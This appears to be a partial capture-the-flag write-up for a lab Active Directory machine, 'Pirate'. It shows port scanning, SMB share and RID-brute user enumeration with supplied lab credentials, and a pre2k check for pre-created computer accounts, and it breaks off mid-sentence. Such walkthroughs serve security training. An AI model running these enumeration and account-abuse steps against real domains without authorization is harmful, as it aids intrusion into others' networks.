# Machine Description
As is common in real life pentests, you will start the Pirate box with credentials for the following account pentest / p3nt3st2025!&

```python
pentest:p3nt3st2025!&
```

# Host file setup
```python
sudo nxc smb 10.129.244.95 --generate-hosts-file /etc/hosts  
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn 10.129.244.95 -vv

Nmap scan report for 10.129.244.95
Host is up, received user-set (0.014s latency).
Scanned at 2026-09-24 16:27:34 BST for 66s
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
2179/tcp  open  vmrdp            syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49667/tcp open  unknown          syn-ack
49683/tcp open  unknown          syn-ack
49684/tcp open  unknown          syn-ack
49686/tcp open  unknown          syn-ack
49689/tcp open  unknown          syn-ack
49913/tcp open  unknown          syn-ack
49936/tcp open  unknown          syn-ack
```

## Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,2179,3268,3269,5985 -A --min-rate=2000 -sT -Pn dc01.pirate.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-24 16:30 +0100
Nmap scan report for dc01.pirate.htb (10.129.244.95)
Host is up (0.014s latency).
rDNS record for 10.129.244.95: DC01.pirate.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-24 22:30:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-24T22:31:40+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-09-24T22:17:27
|_Not valid after:  2027-09-24T22:17:27
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-24T22:31:40+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-09-24T22:17:27
|_Not valid after:  2027-09-24T22:17:27
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-24T22:31:40+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-09-24T22:17:27
|_Not valid after:  2027-09-24T22:17:27
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-09-24T22:17:27
|_Not valid after:  2027-09-24T22:17:27
|_ssl-date: 2026-09-24T22:31:40+00:00; +7h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# HTTP (80)

Looks to be default IIS

# SMB (445)
Null auth is enabled but cannot use it to enumerate

The guest account is also disabled

## Using provided credentials
```python
nxc smb dc01.pirate.htb -u pentest -p 'p3nt3st2025!&'
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
```

These credentials allow me to authenticate

### Shares
```python
nxc smb dc01.pirate.htb -u pentest -p 'p3nt3st2025!&' --shares
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
SMB         10.129.244.95   445    DC01             [*] Enumerated shares
SMB         10.129.244.95   445    DC01             Share           Permissions     Remark
SMB         10.129.244.95   445    DC01             -----           -----------     ------
SMB         10.129.244.95   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.244.95   445    DC01             C$                              Default share
SMB         10.129.244.95   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.244.95   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.244.95   445    DC01             SYSVOL          READ            Logon server share
```

Just default shares

### Users
```python
nxc smb dc01.pirate.htb -u pentest -p 'p3nt3st2025!&' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
a.white_adm
a.white
WEB01$
MS01$
EXCH01$
gMSA_ADCS_prod$
pentest
gMSA_ADFS_prod$
j.sparrow
```

Ill use `--rid-brute` to also get machine accounts

# Pre 2000 computer accounts

```python
nxc ldap dc01.pirate.htb -u pentest -p 'p3nt3st2025!&' -M pre2k
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
PRE2K       10.129.244.95   389    DC01             Pre-created computer account: MS01$
PRE2K       10.129.244.95   389    DC01             Pre-created computer account: EXCH01$
PRE2K       10.129.244.95   389    DC01             [+] Found 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
PRE2K       10.129.244.95   389    DC01             [-] Failed to get TGT for ms01@pirate.htb: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
PRE2K       10.129.244.95   389    DC01             [-] Failed to get TGT for exch01@pirate.htb: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

After seeing some 

